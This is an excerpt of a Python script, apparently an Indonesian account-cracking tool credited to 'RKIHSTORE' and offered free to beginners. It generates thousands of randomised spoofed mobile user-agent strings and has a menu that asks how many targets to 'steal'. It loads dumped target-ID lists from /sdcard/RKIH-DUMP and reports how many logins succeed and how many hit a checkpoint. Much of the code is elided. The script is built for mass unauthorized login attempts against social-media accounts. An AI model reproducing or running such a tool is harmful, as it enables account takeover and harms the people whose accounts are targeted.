...
for pepeh in range(10000):
	...
	f='AppleWebKit/5.1.34.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 /'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/534.13 PHLolsec/1.3.0'
	...
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/534.13 Edg/105.0.0.0'
	okepku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(okepku)
...
for pepeh in range(10000):
	...
	c='NokiaN9)'
	d='AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/534.13 Edg/101.0.4951.41'
	okepku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(okepku2)
	
	a='Mozilla/5.0 (Opera/12.02'
	b=random.choice(['5','6','7','8','9','10','12','13'])
	c='Linux; Opera Mobi/ADR-111101157 )'
	d='AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/535.1 3gpp-gba'
	okepku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(okepku2)
#------------[ Ɑ͞ ̶͞ ̶͞ ඩⱭ͞ ̶͞ ̶͞ ඩⱭ͞ ̶͞ ̶͞ ඩ ]---------------#
...
def banner():
	print(f'''\t
{h}____  _  _____ _   _ ____ _____ ___  ____  _____
...
• {m} AUTHOR : RKIHSTORE
• {h} GROUP : CYBER MASK BUNNY •
• {h} STATUS: FREE AJAH BUAT PEMULAH🥰🥰
• {h} VERSI : V999
• {h} https://github.com/RKIHSTORE
 
  {h}Owner  AbaL" RKIHSTORE ''')                                         
#--------------------[ Ɑ͞ ̶͞ ̶͞ ඩMASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang My Scrip [yellow]%s[white] Dosa TanggungLu '%(my_name)))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('Nyolong Berapa Target ? : '))
	except ValueError:
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/RKIH-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/RKIH-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/RKIH-DUMP/'+geh,'r').read().splitlines()
		except:
...
def method_validate(idf,pwv):
	...
	fff = '%'
	sys.stdout.write(f"\r [RKIHSTORE] {h}{P}{b}{loop}{P}/{P}{len(id)}{P} {hh}OK:{P}{ok}{P} {kk}CP:{P}{cp}{x}  {P}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
